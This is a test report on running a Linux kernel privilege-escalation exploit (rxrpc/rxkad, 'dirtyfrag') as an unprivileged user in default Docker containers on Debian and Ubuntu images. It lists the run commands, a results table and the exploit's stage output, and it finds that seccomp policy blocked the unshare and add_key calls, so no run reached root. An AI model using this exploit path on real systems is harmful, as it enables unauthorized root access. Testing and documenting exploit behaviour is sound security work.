# Docker Lowpriv Execution Results

Date: 2026-05-08

Scope:

- Images tested: `debian:11`, `debian:12`, `ubuntu:20.04`, `ubuntu:22.04`, `ubuntu:24.04`
- Builds tested:
  - `exp-x86_64-glibc-dynamic`
  - `exp-x86_64-glibc-static`
- Test user created inside each disposable container:
  - `lowpriv`
  - no sudo group membership

Command shape:

```bash
useradd -m -s /bin/sh lowpriv
su -s /bin/sh lowpriv -c id
su -s /bin/sh lowpriv -c "DIRTYFRAG_VERBOSE=1 LPE_AUTO_VERIFY=1 timeout 20 /tmp/<build>"
su -s /bin/sh lowpriv -c id
```

Important container note:

These were default Docker containers, not privileged containers. The exploit
failed where Docker/seccomp/container policy blocked `unshare()` and/or
`add_key("rxrpc", ...)`.

## Summary

| Image | Build | Before `id` | Result | After `id` |
| --- | --- | --- | --- | --- |
| `debian:11` | dynamic | `uid=1000(lowpriv)` | failed loader: missing glibc symbols | `uid=1000(lowpriv)` |
| `debian:11` | static | `uid=1000(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1000(lowpriv)` |
| `debian:12` | dynamic | `uid=1000(lowpriv)` | failed loader: missing `GLIBC_2.38` | `uid=1000(lowpriv)` |
| `debian:12` | static | `uid=1000(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1000(lowpriv)` |
| `ubuntu:20.04` | dynamic | `uid=1000(lowpriv)` | failed loader: missing glibc symbols | `uid=1000(lowpriv)` |
| `ubuntu:20.04` | static | `uid=1000(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1000(lowpriv)` |
| `ubuntu:22.04` | dynamic | `uid=1000(lowpriv)` | failed loader: missing `GLIBC_2.38` | `uid=1000(lowpriv)` |
| `ubuntu:22.04` | static | `uid=1000(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1000(lowpriv)` |
| `ubuntu:24.04` | dynamic | `uid=1001(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1001(lowpriv)` |
| `ubuntu:24.04` | static | `uid=1001(lowpriv)` | exploit ran, failed: `unshare: Operation not permitted`, `add_rxrpc_key(...): Operation not permitted`, `EXP_RC=3` | `uid=1001(lowpriv)` |

## Common Exploit Output

For the static build on Debian/Ubuntu and for the dynamic build on Ubuntu
24.04, the exploit entered the expected code path as lowpriv:

```text
[su] unshare: Operation not permitted
[su] corruption stage failed (status=0x100)

=== rxrpc/rxkad LPE EXPLOIT (uid=1000 -> root) ===
[*] uid=1000 euid=1000 gid=1000
...
=== STAGE 2a: kernel trigger A @ off 4 (set chars 4-5 "::") ===
[!] add_rxrpc_key(evil0): Operation not permitted
[!] kernel trigger A failed
dirtyfrag: failed (rc=3)
EXP_RC=3
```

On Ubuntu 24.04, the created lowpriv uid/gid was `1001` because uid `1000`
was already allocated in the base image:

```text
[*] uid=1001 euid=1001 gid=1001
```

## Representative `id` Output

Debian 11/12 and Ubuntu 20.04/22.04:

```text
ID_BEFORE
uid=1000(lowpriv) gid=1000(lowpriv) groups=1000(lowpriv)
...
ID_AFTER
uid=1000(lowpriv) gid=1000(lowpriv) groups=1000(lowpriv)
```

Ubuntu 24.04:

```text
ID_BEFORE
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
...
ID_AFTER
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
```

## Interpretation

- No Docker lowpriv test produced a root `id`.
- The dynamic build is still only runnable on `ubuntu:24.04` among the tested
  images.
- The static build runs across all tested images, but the exploit is blocked by
  default Docker/container policy.
- The relevant blockers observed are:
  - `unshare: Operation not permitted`
  - `add_rxrpc_key(...): Operation not permitted`

For realistic exploit validation, test outside default Docker confinement or in
a dedicated VM/CTF host where the target kernel and namespace/keyring policies
match the intended scenario.
